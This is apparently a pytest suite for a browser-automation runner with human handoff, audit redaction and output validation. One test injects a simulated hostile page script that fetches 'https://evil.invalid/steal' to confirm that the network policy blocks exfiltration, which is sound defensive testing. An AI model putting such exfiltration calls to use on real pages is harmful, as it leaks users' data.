import asyncio
import json
import uuid

import pytest

from capability_runner.engine import RunManager
from capability_runner.profile import OUTPUTS
from capability_runner.schema import Action
from capability_runner.storage import verify_chain
from capability_runner.surface import BrowserSurface

pytestmark = pytest.mark.browser


async def wait_paused(run):
    # Allow instrumented/loaded CI hosts to reach the intervention; this is not a production timeout.
    for _ in range(1000):
        state = await run.gate.view()
        if state["state"] == "PAUSED":
            return state
        if run.result:
            raise AssertionError("Run ended before intervention: " + run.result.code)
        await asyncio.sleep(0.03)
    raise AssertionError("No intervention")


@pytest.mark.parametrize("member,expected", [("10001", "12450.75"), ("10002", "807.20"), ("10003", "0.00")])
async def test_real_replay_zero_model_calls(manager, artifact, monkeypatch, member, expected):
    def no_planner(*args):
        raise AssertionError("Replay must not even construct an LLM adapter")
    monkeypatch.setattr("capability_runner.engine.make_planner", no_planner)
    run = manager.start("replay", {"member_id": member}, capability=artifact)
    await run.task
    assert run.result.status == "success", run.result
    assert run.result.outputs == {"balance": expected, "currency": "USD"}
    assert run.result.llm_calls == 0
    assert run.surface.page is None
    assert not run.inputs
    assert verify_chain(run.audit.path)


@pytest.mark.parametrize("member,code", [("99999", "NOT_FOUND"), ("00000", "VALIDATION_ERROR")])
async def test_expected_business_outcomes(manager, artifact, member, code):
    run = manager.start("replay", {"member_id": member}, capability=artifact)
    await run.task
    assert run.result.status == "business_outcome" and run.result.code == code
    assert not run.result.outputs and run.result.llm_calls == 0
    assert list(run.audit.directory.glob("*.dom.json"))
    assert ('"' + member + '"') not in run.audit.path.read_text()


async def test_permission_denied_member_requests_handoff(manager, artifact):
    run = manager.start("replay", {"member_id": "90001"}, capability=artifact)
    state = await wait_paused(run)
    assert state["intervention"]["code"] == "PERMISSION_DENIED"
    await manager.cancel(run.id)


@pytest.mark.parametrize("scenario", ["notice", "transient", "slow"])
async def test_recoverable_states(manager, artifact, settings, scenario):
    run = manager.start("replay", {"member_id": "10002"}, "sandbox://legacy?scenario=" + scenario, capability=artifact)
    await run.task
    assert run.result.status == "success", run.result
    assert run.result.interventions == 0
    if scenario != "slow":
        assert "recovery_action" in run.audit.path.read_text()


@pytest.mark.parametrize("scenario,target", [("session", "restore_session"), ("dialog", "acknowledge_warning")])
async def test_handoff_same_session(manager, artifact, settings, scenario, target):
    run = manager.start("replay", {"member_id": "10002"}, "sandbox://legacy?scenario=" + scenario, capability=artifact)
    original_session = run.surface.session_id
    state = await wait_paused(run)
    original_page = run.surface.page
    claim = await run.gate.claim(state["revision"])
    image = await run.gate.read_live(claim["control_token"], claim["revision"], run.surface.screenshot)
    assert image.startswith(b"\x89PNG")
    action = Action(kind="click", target=target)
    await run.gate.perform(claim["control_token"], claim["revision"], uuid.uuid4().hex, action,
                           lambda: run.surface.act(action, run.inputs, "human"))
    assert run.surface.page is original_page
    assert run.surface.session_id == original_session
    await run.gate.resume(claim["control_token"], claim["revision"])
    await run.task
    assert run.result.status == "success", run.result
    assert run.result.interventions == 1 and run.result.llm_calls == 0
    events = [json.loads(line) for line in run.audit.path.read_text().splitlines()]
    assert sum(event["event"] == "human_action" for event in events) == 1
    assert not list(run.audit.directory.glob("*.png"))


@pytest.mark.parametrize("scenario,code", [("permission", "PERMISSION_DENIED"), ("drift", "APP_VERSION_MISMATCH"),
                                          ("ambiguous", "AMBIGUOUS_TARGET"), ("outage", "RECOVERY_EXHAUSTED")])
async def test_hard_failures_escalate(manager, artifact, settings, scenario, code):
    run = manager.start("replay", {"member_id": "10002"}, "sandbox://legacy?scenario=" + scenario, capability=artifact)
    state = await wait_paused(run)
    assert state["intervention"]["code"] == code
    await manager.cancel(run.id)
    assert run.result.code == "RUN_CANCELLED"
    assert run.surface.page is None


async def test_snapshot_has_no_raw_sensitive_data(manager, artifact, settings):
    run = manager.start("replay", {"member_id": "10001"}, "sandbox://legacy?scenario=session", capability=artifact)
    await wait_paused(run)
    action = Action(kind="click", target="restore_session")
    claim = await run.gate.claim(run.gate.revision)
    await run.gate.perform(claim["control_token"], claim["revision"], uuid.uuid4().hex, action,
                           lambda: run.surface.act(action, run.inputs, "human"))
    snapshot = json.dumps(await run.surface.snapshot())
    assert "[REDACTED]" in snapshot
    for sensitive in ("10001", "12450.75", "Maya Carter", "synthetic.person@example.invalid", claim["control_token"]):
        assert sensitive not in snapshot
        assert sensitive not in run.audit.path.read_text()
    await manager.cancel(run.id)


async def test_network_policy_blocks_browser_egress(settings, policy):
    surface = BrowserSurface(settings, policy, "sandbox://legacy")
    await surface.start()
    try:
        await surface.act(Action(kind="navigate", path="/legacy"), {})
        # Test code, NOT an agent-accessible evaluate action. This simulates hostile page script.
        result = await surface.page.evaluate("async () => { try { await fetch('https://evil.invalid/steal'); return 'sent'; } catch { return 'blocked'; }}")
        assert result == "blocked"
        # The fixture CSP can block earlier than the browser route, which is also an acceptable denial.
    finally:
        await surface.close()


async def test_runtime_output_validation(manager, artifact):
    run = manager.start("replay", {"member_id": "10001"}, capability=artifact)
    actual = run.surface.act
    async def corrupt_output(action, inputs, actor="automation"):
        if action.kind == "extract" and action.output == "balance":
            return "NaN"
        return await actual(action, inputs, actor)
    run.surface.act = corrupt_output
    await run.task
    assert run.result.code == "OUTPUT_VALIDATION_FAILED"
    assert not run.result.outputs


async def test_intervention_timeout_closes_browser(settings, policy, artifact):
    settings.intervention_timeout_seconds = 1
    manager = RunManager(settings, policy)
    try:
        run = manager.start("replay", {"member_id": "10001"}, "sandbox://legacy?scenario=permission", capability=artifact)
        await run.task
        assert run.result.code == "INTERVENTION_TIMEOUT"
        assert run.surface.page is None
    finally:
        await manager.close()


@pytest.mark.parametrize("committed", [False, True])
async def test_timeout_retry_does_not_double_apply_committed_click(manager, artifact, committed):
    from capability_runner.surface import SurfaceError
    run = manager.start("replay", {"member_id": "10002"}, capability=artifact)
    actual = run.surface.act
    attempts = 0
    async def one_timeout(action, inputs, actor="automation"):
        nonlocal attempts
        if action.target == "search":
            attempts += 1
            if attempts == 1:
                if committed:
                    await actual(action, inputs, actor)
                raise SurfaceError("ACTION_TIMEOUT", "search")
        return await actual(action, inputs, actor)
    run.surface.act = one_timeout
    await run.task
    assert run.result.status == "success", run.result
    assert attempts == (1 if committed else 2)
